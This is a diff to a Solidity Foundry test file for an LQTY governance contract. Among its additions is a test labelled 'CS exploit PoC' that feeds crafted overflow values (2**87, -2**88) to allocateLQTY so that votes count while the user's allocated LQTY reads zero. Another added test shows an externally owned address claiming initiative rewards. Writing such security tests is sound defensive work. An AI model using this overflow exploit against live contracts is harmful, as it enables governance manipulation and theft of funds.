@@ -100,6 +100,7 @@ contract GovernanceTest is Test {
 
         initialInitiatives.push(baseInitiative1);
         initialInitiatives.push(baseInitiative2);
+        initialInitiatives.push(baseInitiative3);
 
         governance = new Governance(
             address(lqty),
@@ -738,7 +739,7 @@ contract GovernanceTest is Test {
         vm.stopPrank();
     }
 
-    function test_allocateLQTY() public {
+    function test_allocateLQTY_single() public {
         vm.startPrank(user);
 
         address userProxy = governance.deployUserProxy();
@@ -754,7 +755,7 @@ contract GovernanceTest is Test {
         address[] memory initiatives = new address[](1);
         initiatives[0] = baseInitiative1;
         int176[] memory deltaLQTYVotes = new int176[](1);
-        deltaLQTYVotes[0] = 1e18;
+        deltaLQTYVotes[0] = 1e18; //this should be 0
         int176[] memory deltaLQTYVetos = new int176[](1);
 
         // should revert if the initiative has been registered in the current epoch
@@ -1036,6 +1037,82 @@ contract GovernanceTest is Test {
         vm.stopPrank();
     }
 
+    // this shouldn't happen
+    function off_claimForInitiativeEOA() public {
+        address EOAInitiative = address(0xbeef);
+
+        vm.startPrank(user);
+
+        // deploy
+        address userProxy = governance.deployUserProxy();
+
+        lqty.approve(address(userProxy), 1000e18);
+        governance.depositLQTY(1000e18);
+
+        vm.warp(block.timestamp + 365 days);
+
+        vm.stopPrank();
+
+        vm.startPrank(lusdHolder);
+        lusd.transfer(address(governance), 10000e18);
+        vm.stopPrank();
+
+        vm.startPrank(user);
+
+        address[] memory initiatives = new address[](2);
+        initiatives[0] = EOAInitiative; // attempt for an EOA
+        initiatives[1] = baseInitiative2;
+        int176[] memory deltaVoteLQTY = new int176[](2);
+        deltaVoteLQTY[0] = 500e18;
+        deltaVoteLQTY[1] = 500e18;
+        int176[] memory deltaVetoLQTY = new int176[](2);
+        governance.allocateLQTY(initiatives, deltaVoteLQTY, deltaVetoLQTY);
+        (uint88 allocatedLQTY,) = governance.userStates(user);
+        assertEq(allocatedLQTY, 1000e18);
+
+        vm.warp(block.timestamp + governance.EPOCH_DURATION() + 1);
+
+        // should compute the claim and transfer it to the initiative
+        assertEq(governance.claimForInitiative(EOAInitiative), 5000e18);
+        governance.claimForInitiative(EOAInitiative);
+        assertEq(governance.claimForInitiative(EOAInitiative), 0);
+        assertEq(lusd.balanceOf(EOAInitiative), 5000e18);
+
+        assertEq(governance.claimForInitiative(baseInitiative2), 5000e18);
+        assertEq(governance.claimForInitiative(baseInitiative2), 0);
+
+        assertEq(lusd.balanceOf(baseInitiative2), 5000e18);
+
+        vm.stopPrank();
+
+        vm.startPrank(lusdHolder);
+        lusd.transfer(address(governance), 10000e18);
+        vm.stopPrank();
+
+        vm.startPrank(user);
+
+        initiatives[0] = EOAInitiative;
+        initiatives[1] = baseInitiative2;
+        deltaVoteLQTY[0] = 495e18;
+        deltaVoteLQTY[1] = -495e18;
+        governance.allocateLQTY(initiatives, deltaVoteLQTY, deltaVetoLQTY);
+
+        vm.warp(block.timestamp + governance.EPOCH_DURATION() + 1);
+
+        assertEq(governance.claimForInitiative(EOAInitiative), 10000e18);
+        // should not allow double claiming
+        assertEq(governance.claimForInitiative(EOAInitiative), 0);
+
+        assertEq(lusd.balanceOf(EOAInitiative), 15000e18);
+
+        assertEq(governance.claimForInitiative(baseInitiative2), 0);
+        assertEq(governance.claimForInitiative(baseInitiative2), 0);
+
+        assertEq(lusd.balanceOf(baseInitiative2), 5000e18);
+
+        vm.stopPrank();
+    }
+
     function test_multicall() public {
         vm.startPrank(user);
 
@@ -1170,5 +1247,40 @@ contract GovernanceTest is Test {
         assertEq(lastCountedEpoch, 0);
 
         governance.unregisterInitiative(address(mockInitiative));
+    }
+
+    // CS exploit PoC
+    function test_allocateLQTY_overflow() public {
+        vm.startPrank(user);
+
+        address[] memory initiatives = new address[](3);
+        initiatives[0] = baseInitiative1;
+        initiatives[1] = baseInitiative3;
+        initiatives[2] = baseInitiative2;
+        int176[] memory deltaLQTYVotes = new int176[](3);
+        deltaLQTYVotes[0] = 154742504910672534362390528; // 2**87
+        deltaLQTYVotes[1] = 0;
+        deltaLQTYVotes[2] = 154742504910672534362390527; // 2**87 - 1
+        int176[] memory deltaLQTYVetos = new int176[](3);
+        deltaLQTYVetos[0] = 0;
+        deltaLQTYVetos[1] = 1;
+        deltaLQTYVetos[2] = -309485009821345068724781056; // - 2**88
+
+        vm.warp(block.timestamp + 365 days);
+        governance.allocateLQTY(initiatives, deltaLQTYVotes, deltaLQTYVetos);
+
+        (uint allocatedLQTY,) = governance.userStates(user);
+        assertEq(allocatedLQTY, 0);
+        console.log(allocatedLQTY);
+
+        (uint88 voteLQTY1,,,,) = governance.initiativeStates(baseInitiative1);
+        assertGt(voteLQTY1, 0);
+        console.log(voteLQTY1);
+
+        (uint88 voteLQTY2,,,,) = governance.initiativeStates(baseInitiative2);
+        assertGt(voteLQTY2, 0);
+        console.log(voteLQTY2);
+
+        vm.stopPrank();
     }
 }
